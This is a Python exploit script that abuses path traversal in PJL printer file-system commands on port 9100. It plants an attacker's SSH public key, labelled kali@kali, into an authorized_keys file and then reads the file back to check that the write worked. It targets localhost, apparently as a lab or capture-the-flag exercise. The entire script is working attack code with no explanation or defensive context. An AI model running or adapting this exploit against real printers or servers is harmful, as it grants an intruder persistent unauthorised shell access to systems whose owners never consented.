#!/usr/bin/env python3
import socket

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
PATH = "../.ssh/authorized_keys"
N = len(KEY)


def talk(payload: bytes, t: float = 8) -> bytes:
    s = socket.socket()
    s.settimeout(t)
    s.connect(("127.0.0.1", 9100))
    s.sendall(payload)
    out = b""
    try:
        while True:
            c = s.recv(8192)
            if not c:
                break
            out += c
    except socket.timeout:
        pass
    s.close()
    return out


talk(b'@PJL FSMKDIR NAME="../.ssh"\r\n')
talk(f'@PJL FSDELETE NAME="{PATH}"\r\n'.encode())

for verb in ("FSWRT", "FSAPPEND", "FSUPLOAD"):
    cmd = f'@PJL {verb} NAME="{PATH}" SIZE={N}\r\n'.encode() + KEY
    r = talk(cmd)
    print(verb, "resp", repr(r[:80]))
    dl = talk(f'@PJL FSDOWNLOAD NAME="{PATH}" SIZE={N}\r\n'.encode())
    print(verb, "dl", len(dl), dl[:120])
    print(verb, "q", talk(b'@PJL FSQUERY NAME="../.ssh"\r\n'))
    talk(f'@PJL FSDELETE NAME="{PATH}"\r\n'.encode())